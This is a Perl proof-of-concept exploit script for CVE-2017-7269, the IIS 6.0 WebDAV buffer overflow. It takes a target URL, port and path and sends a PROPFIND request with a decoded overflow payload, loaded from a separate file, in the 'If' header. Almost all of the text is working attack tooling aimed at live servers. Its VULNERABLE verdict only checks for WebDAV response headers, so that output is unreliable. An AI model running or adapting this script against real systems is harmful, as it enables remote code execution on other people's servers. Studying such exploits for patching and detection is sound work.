#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use Term::ANSIColor qw(colored color);
use Scalar::Util qw/reftype/;
use MIME::Base64;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;
use Getopt::Long;

=pod

=head1 CVE-2017-7269

=head2 Date
2017-05-11

=head2 Reporter(s)
Zhiniang Peng & Chen Wu

=head2 Description 
Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with "If: <http://" in a PROPFIND request, as exploited in the wild in July or August 2016. 
=cut

# Global Variables
my $DEBUG = 0;
my $VERBOSE = 0;

# Display The Header
header();

# Run The PoC
exploit();


sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2017-7269 ]=================================";
    
    print qq{
$title
            
   Reporter : Zhiniang Peng & Chen Wu
       Date : 2017-05-11
        CVE : CVE-2017-7269
            
Description :

Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in 
Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 
allows remote attackers to execute arbitrary code via a long header beginning 
with "If: <http://" in a PROPFIND request, as exploited in the wild 
in July or August 2016.
 

};
    print "="x(length($title)) . "\n\n";
}

sub exploit_header {
    system("clear");
    print color("red");

    
    print color("green");
    print "\nGithub : https://github.com/gottburgm/\n";
    print "\n\n";
}

sub Help {
    print "\n";
    print qq {  
        # Usage
            perl $0  --url URL [OPTIONS]
        
        # Example
            perl $0 --url http://127.0.0.1 --path /dav/ --port 8666
        
        # Arguments


            --url [VALUE]		: The Target URL [Format: scheme://host]
            --port                      : The target port
            --path                      : The Path On Which The WebDAV Is Installed
            --user-agent [VALUE]	: User-Agent To Send To Server
            --cookie [VALUE]		: Cookie String To Use
            --proxy [VALUE]		: Proxy Server To Use [Format: scheme://host:port]
            --timeout [VALUE]		: Max Timeout For The HTTP Requests
            --auth [VALUE]		: Credentials To Use For HTTP Login [Format: username:password]
            --help        		: Display The Help Menu
            --verbose        		: Be More Verbose
            --debug        		: Debug Mode
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'PUT', 'DELETE', 'POST', 'HEAD', 'OPTIONS', 'PROPFIND']);
    $browser->cookie_jar( $cookie_jar);
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $payload = '?' . $payload if($payload);
        $request = new HTTP::Request $method, $url . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload) if($payload);
    }
    $request->content_type($content_type) if($content_type);
    
    return $request;
}

sub exploit {
    my $browser = 0;
    my $request = 0;
    my $response = 0;
    my $method = 0;
    my $content_type = 0;
    my $base_url = 0;
    my $base_path = 0;
    my $path = "/";
    my $payload = 0;
    my $vulnerable = 1;


    my $cookie_string = 0;	# Command Argument : cookie
    my $useragent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0";		# Command Argument : user-agent
    my $url = 0;		# Command Argument : url
    my $port = 80;              # Command Argument : port
    my $proxy = 0;		# Command Argument : proxy
    my $timeout = 30;  		# Command Argument : timeout
    my $auth = 0;		# Command Argument : auth

    GetOptions(
    	"cookie=s"		=> \$cookie_string,
    	"user-agent=s"		=> \$useragent,
    	"verbose!"		=> \$VERBOSE,
    	"url=s"		        => \$url,
        "path=s"                => \$path,
        "port=i"                => \$port,
    	"help!"		        => \&Help,
    	"debug!"		=> \$DEBUG,
    	"proxy=s"		=> \$proxy,
    	"timeout=i"		=> \$timeout,
    	"auth=s"		=> \$auth,
    ) or error("Bad Value(s) Provided In Command Line Arguments");

    ### Required Arguments
    die error("Required Argument(s) Missing .") if(!$url);    
    
    exploit_header();
    
    if($url =~ /https?:\/\/[^\/]*\/[a-zA-Z0-9\-\.\_\/\\]+/i) {
        ($base_url, $base_path) = $url =~ /(https?:\/\/[^\/]*)(\/[^\?]*)/i;
    }
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    $browser->default_header('Cookie' => $cookie_string) if($cookie_string);
    
    if($proxy) {
        if($proxy =~ /([a-z])+:\/\/.*:([0-9])+/i) {
            $browser->proxy( [qw( http https ftp ftps )] => $proxy);
        } else {
            error("Wrong Proxy String Given, Use Format : scheme://host:port");
        }
    }
    
    
    ### Build/send the requests

  $method = "PROPFIND";
  $payload = "";
  $content_type = "";

  info("Sending payload ...");
  info("Sending : ($method) $url$path");
  $url = $url . ":" . $port . $path;
  $request = buildRequest($url, $method, $payload, $content_type);
  # Set Headers On EXPLOIT1
  my $if_payload = decode_base64(join("", read_file("src/CVE_2017_7269.payload", 1)));
  $request->header("Content-Length" => "0");
  $request->header("If" => $if_payload);
  $response = $browser->request($request);
  displayResponse($response);

  $vulnerable = 0 if(!validate("THEADER", "MS-Author-Via:DAV", $response) && !validate("THEADER", "DASL:<DAV:sql>", $response));
    
  ### Validate or not the test
  if($vulnerable) {
      print "\n\n" . color("white") . "[" . color("red") . "VULNERABLE" . color("white") . "] " . color("green") . $url . color("white") . " is affected or any kind of validation was provided.\n";
  } else {
      print "\n\n" . color("white") . "[" . color("yellow") . "NOT VULNERABLE" . color("white") . "] " . color("green") . $url . color("white") . " is not affected.\n";
  }
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value = 0;
    my $positive = 1;
    my $status = "FAILED";
    my $status_color = "red";
    my $type = substr($validation_mode, 1, length($validation_mode));
    
    $positive = 0 if(substr(uc($validation_mode), 0, 1) eq 'F');
    
    given(substr($validation_mode, 1, length($validation_mode))) {
        
        when(/CODE/i) { $value = $response->code; }
        
        when(/SIZE/i) { $value = length($response->content); }
        
        when(/STRING|REGEX/i) {  $value = $response->content; }
        
        when(/HEADER/i) {
            my @header_parts = split(':', $validation_value);
            
            if($header_parts[0]) {
                if($response->header($header_parts[0])) {
                    if($header_parts[1]) {
                        return $positive if($response->header($header_parts[0]) =~ $header_parts[1]);
                    } else {
                        return $positive;
                    }
                } else {
                    warning("Expected : " . $header_parts[0] . " Not Found In Response Headers");
                    return 0;
                }
            } else {
                return 0;
            }
        }
    }
    
    if($validation_value && $validation_value =~ /$value/i || $validation_value eq $value) {
        if($VERBOSE || $DEBUG) {
            if($positive) {
                $status = "SUCESS";
                $status_color = "green";
         
                print color("white") . "   [" . color("magenta") . "V" . color("white") . "]" . color("blue") . "( " . color("$status_color") . $status . color("blue") . " ) [Validation] Expected : " . color("cyan") . "$validation_value" . color("blue") . ", Got : " . color("cyan") . "$value\n";
            }
        }
        
        return $positive;
    }
    
    return 0;
}

sub displayResponse {
    my ( $response ) = @_;
    my $request = $response->request;
    
    ### Request
    print "\n\n" . color("yellow") . "--> " . color("blue") .  uc($request->method) . color("cyan") . ' ' . $request->uri->path . color("white") . " HTTP/1.1\n";
    print color("yellow") . "--> "  . color("white") . "Host: " .  color("cyan") . $request->uri->host . "\n";
    
    foreach my $header_name (keys %{ $request->headers }) {
        next if(reftype($request->header($header_name)));
        print color("yellow") . "--> "  . color("white") . $header_name . ": " . color("cyan") . $request->header($header_name) . "\n";
    }
    
    if($request->content) {
        print color("yellow") . "--> "  . color("white") . $request->content . "\n";
    }
    print "\n\n";
    
    
    ### Response
    print color("green") . "<-- "  . color("white") . "HTTP/1.1 " . color("cyan") . $response->status_line . "\n";
    
    foreach my $header_name (keys %{ $response->headers }) {
        next if(reftype($response->header($header_name)));
        print color("green") . "<-- "  . color("white") . $header_name . ": " . color("cyan") . $response->header($header_name) . "\n";
    }
    print "\n" . color("white") . $response->decoded_content . "\n";
}

sub info {
    my ( $text ) = @_;
    print color("white") . "[" . color("blue") . "*" . color("white") . "]" . color("blue") . " INFO" . color("white") . ": " . color("blue") . " $text\n";
}

sub warning {
    my ( $text ) = @_;
    print color("white") . "[" . color("yellow") . "!" . color("white") . "]" . color("yellow") . " WARNING" . color("white") . ": " . color("blue") . "$text\n";
}

sub error {
    my ( $text ) = @_;
    print color("white") . "[" . color("red") . "-" . color("white") . "]" . color("red") . " ERROR" . color("white") . ": " . color("blue") . "$text\n";
    exit;
}

sub read_file {
    my ($file, $chomp) = @_;
    $chomp = 0 if(!defined($chomp));
    
    my @final_content = ();
    
    open FILE, $file or die error("$file Couldn't Be Read  .");
    my @content = <FILE>;
    close FILE;
    
    if($chomp) {
        foreach my $line (@content) {
            chomp $line;
            push(@final_content, $line);
        }
    } else {
        @final_content = @content;   
    }
    
    return @final_content;
}

